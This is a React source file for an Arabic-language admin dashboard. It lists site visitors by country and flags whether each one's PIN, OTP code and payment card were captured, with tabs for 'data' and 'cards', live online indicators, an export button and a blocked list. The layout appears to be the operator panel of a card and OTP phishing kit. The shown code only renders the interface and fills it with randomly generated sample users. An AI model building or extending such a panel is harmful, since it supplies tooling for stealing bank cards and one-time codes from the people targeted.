import React, { useEffect, useState } from "react";
import { 
  Users, 
  Search,
  MessageSquare,
  Phone,
  CreditCard,
  Shield,
  Download,
  AlertTriangle,
  Globe,
  User
} from "lucide-react";
import { cn } from "@/lib/utils";
import { api } from "@/lib/api";
import { useWebSocket } from "@/hooks/useWebSocket";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";

interface UserEntry {
  id: number;
  name: string;
  country: string;
  timeAgo: string;
  hasOTP: boolean;
  hasPIN: boolean;
  hasCard: boolean;
  isOnline: boolean;
  email?: string;
  phone?: string;
  type: "visitor" | "data" | "card";
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { isConnected, stats: realtimeStats } = useWebSocket();
  const [users, setUsers] = useState<UserEntry[]>([]);
  const [selectedUser, setSelectedUser] = useState<UserEntry | null>(null);
  const [activeTab, setActiveTab] = useState<"all" | "data" | "visitors" | "cards">("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [stats, setStats] = useState({
    total: 0,
    data: 0,
    visitors: 0,
    cards: 0,
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const dashboardStats = await api.getDashboardStats();
        
        // Generate sample users based on real stats
        const sampleUsers: UserEntry[] = [];
        const countries = ["Jordan", "Qatar", "Australia", "Saudi Arabia", "UAE", "Kuwait"];
        const names = ["sddfsd", "Bb", "sdaasdfas", "Smith ugh", "0558938286", "sdfasdasda", "تجربه رقم مليار", "تست 3", "2129565921"];
        
        for (let i = 0; i < Math.min(dashboardStats.totalVisitors || 10, 20); i++) {
          sampleUsers.push({
            id: i + 1,
            name: names[i % names.length],
            country: countries[Math.floor(Math.random() * countries.length)],
            timeAgo: `${Math.floor(Math.random() * 15) + 1}${Math.random() > 0.5 ? 'س' : 'ي'}`,
            hasOTP: Math.random() > 0.6,
            hasPIN: Math.random() > 0.7,
            hasCard: Math.random() > 0.8,
            isOnline: Math.random() > 0.3,
            type: Math.random() > 0.7 ? "card" : Math.random() > 0.5 ? "data" : "visitor",
            email: `user${i}@example.com`,
            phone: `+974${Math.floor(Math.random() * 90000000 + 10000000)}`,
          });
        }
        
        setUsers(sampleUsers);
        setStats({
          total: dashboardStats.totalVisitors + dashboardStats.applications,
          data: dashboardStats.applications,
          visitors: dashboardStats.totalVisitors,
          cards: Math.floor(dashboardStats.applications * 0.8),
        });
        
        if (sampleUsers.length > 0) {
          setSelectedUser(sampleUsers[0]);
        }
      } catch (error) {
        console.error("Failed to fetch dashboard data:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  // Update stats from WebSocket
  useEffect(() => {
    if (realtimeStats.onlineCount > 0) {
      setStats(prev => ({
        ...prev,
        visitors: realtimeStats.onlineCount * 10,
        total: realtimeStats.onlineCount * 10 + prev.data,
      }));
    }
  }, [realtimeStats.onlineCount]);

  const filteredUsers = users.filter(user => {
    const matchesSearch = user.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         user.country.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesTab = activeTab === "all" ||
                      (activeTab === "data" && user.type === "data") ||
                      (activeTab === "visitors" && user.type === "visitor") ||
                      (activeTab === "cards" && user.type === "card");
    return matchesSearch && matchesTab;
  });

  const handleLogout = () => {
    setLocation("/admin/login");
  };

  return (
    <div className="min-h-screen bg-[#0f1629] text-white flex" dir="rtl">
      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Top Stats Bar */}
        <div className="bg-[#1a2035] border-b border-gray-700 px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2 text-green-400">
              <span className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
              <span className="font-bold text-lg">البريد الوارد</span>
            </div>
            
            <div className="flex items-center gap-4 text-sm">
              <span className="text-gray-400">الكل: <span className="text-white font-bold">{stats.total}</span></span>
              <span className="text-gray-400">بيانات: <span className="text-white font-bold">{stats.data}</span></span>
              <span className="text-gray-400">زوار: <span className="text-white font-bold">{stats.visitors}</span></span>
              <span className="text-gray-400">بطاقات: <span className="text-green-400 font-bold">{stats.cards}</span></span>
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <Download className="h-4 w-4 ml-2" />
              تصدير
            </Button>
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <AlertTriangle className="h-4 w-4 ml-2" />
              المحظورة (0)
            </Button>
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <Globe className="h-4 w-4 ml-2" />
              كل الدول
            </Button>
            <Button 
              variant="ghost" 
              size="sm" 
              className="text-red-400 hover:text-red-300"
              onClick={handleLogout}
            >
              خروج
            </Button>
          </div>
        </div>

        <div className="flex-1 flex">
          {/* Selected User Sidebar */}
          <div className="w-80 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col">
            {selectedUser ? (
              <>
                {/* User Avatar */}
                <div className="text-center mb-6">
                  <div className="w-20 h-20 bg-[#2d3a5f] rounded-full mx-auto flex items-center justify-center mb-3 text-3xl font-bold text-blue-400">
                    {selectedUser.name.charAt(0).toUpperCase()}
                  </div>
                  <h3 className="font-bold text-lg">{selectedUser.name}</h3>
                  <p className="text-sm text-gray-400">{selectedUser.country} •</p>
                </div>

                {/* Action Buttons */}
                <div className="flex flex-wrap gap-2 mb-6 justify-center">
                  <ActionButton icon={MessageSquare} label="الرئيسية" active />
                  <ActionButton icon={Phone} label="هاتف" />
                  <ActionButton icon={Shield} label="تفاصيل" />
                  <ActionButton icon={Shield} label="OTP" highlight />
                  <ActionButton icon={CreditCard} label="بطاقة" />
                </div>

                {/* User Details */}
                <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
                  <User className="h-16 w-16 mb-4 text-gray-600" />
                  <p className="font-medium">زائر فقط</p>
                  <p className="text-sm">لا توجد بيانات مسجلة</p>
                </div>
              </>
            ) : (
              <div className="flex-1 flex items-center justify-center text-gray-500">
                <p>اختر مستخدم للعرض</p>
              </div>
            )}
          </div>

          {/* User List */}
          <div className="flex-1 bg-[#131933] flex flex-col">
            {/* Search and Tabs */}
            <div className="p-4 border-b border-gray-700">
              <div className="relative mb-4">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
                <Input
                  type="text"
                  placeholder="بحث..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 bg-[#1a2035] border-gray-700 text-white placeholder:text-gray-500"
                  data-testid="input-search"
                />
              </div>
              
              {/* Tabs */}
              <div className="flex gap-2">
                <TabButton 
                  label="الكل" 
                  active={activeTab === "all"} 
                  onClick={() => setActiveTab("all")} 
                />
                <TabButton 
                  label="بيانات" 
                  active={activeTab === "data"} 
                  onClick={() => setActiveTab("data")}
                  variant="green"
                />
                <TabButton 
                  label="زوار" 
                  active={activeTab === "visitors"} 
                  onClick={() => setActiveTab("visitors")} 
                />
                <TabButton 
                  label="بطاقات" 
                  active={activeTab === "cards"} 
                  onClick={() => setActiveTab("cards")} 
                />
              </div>
            </div>

            {/* User List */}
            <div className="flex-1 overflow-y-auto">
              {loading ? (
                <div className="flex items-center justify-center h-full text-gray-500">
                  جاري التحميل...
                </div>
              ) : filteredUsers.length === 0 ? (
                <div className="flex items-center justify-center h-full text-gray-500">
                  لا توجد نتائج
                </div>
              ) : (
                <div className="divide-y divide-gray-700/50">
                  {filteredUsers.map((user) => (
                    <UserListItem
                      key={user.id}
                      user={user}
                      isSelected={selectedUser?.id === user.id}
                      onClick={() => setSelectedUser(user)}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function ActionButton({ icon: Icon, label, active, highlight }: { icon: any; label: string; active?: boolean; highlight?: boolean }) {
  return (
    <button
      className={cn(
        "px-3 py-1.5 rounded text-xs font-medium flex items-center gap-1 transition-colors",
        active ? "bg-blue-600 text-white" : 
        highlight ? "bg-green-600 text-white" :
        "bg-[#2d3a5f] text-gray-300 hover:bg-[#3d4a6f]"
      )}
    >
      <Icon className="h-3 w-3" />
      {label}
    </button>
  );
}

function TabButton({ label, active, onClick, variant }: { label: string; active: boolean; onClick: () => void; variant?: "green" }) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "px-4 py-2 rounded-lg text-sm font-medium transition-colors",
        active 
          ? variant === "green" 
            ? "bg-green-600 text-white" 
            : "bg-blue-600 text-white"
          : "bg-[#1a2035] text-gray-400 hover:text-white"
      )}
      data-testid={`tab-${label}`}
    >
      {label}
    </button>
  );
}

function UserListItem({ user, isSelected, onClick }: { user: UserEntry; isSelected: boolean; onClick: () => void }) {
  return (
    <div
      onClick={onClick}
      className={cn(
        "flex items-center justify-between px-4 py-3 cursor-pointer transition-colors",
        isSelected ? "bg-[#1a2035]" : "hover:bg-[#1a2035]/50"
      )}
      data-testid={`user-item-${user.id}`}
    >
      <div className="flex items-center gap-3">
        {/* Online indicator */}
        <span className={cn(
          "w-2.5 h-2.5 rounded-full flex-shrink-0",
          user.isOnline ? "bg-green-500" : "bg-gray-600"
        )} />
        
        <div>
          <p className="font-medium text-white">{user.name}</p>
          <div className="flex items-center gap-2 text-xs text-gray-500">
            <span>{user.country}</span>
            {user.email && <span>@</span>}
          </div>
        </div>
      </div>

      <div className="flex items-center gap-3">
        {/* Status badges */}
        <div className="flex gap-1">
          {user.hasPIN && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-yellow-600/20 text-yellow-400">PIN</span>
          )}
          {user.hasOTP && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-green-600/20 text-green-400">OTP</span>
          )}
          {user.hasCard && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-blue-600/20 text-blue-400">💳</span>
          )}
        </div>
        
        <span className="text-xs text-gray-500">{user.timeAgo}</span>
      </div>
    </div>
  );
}
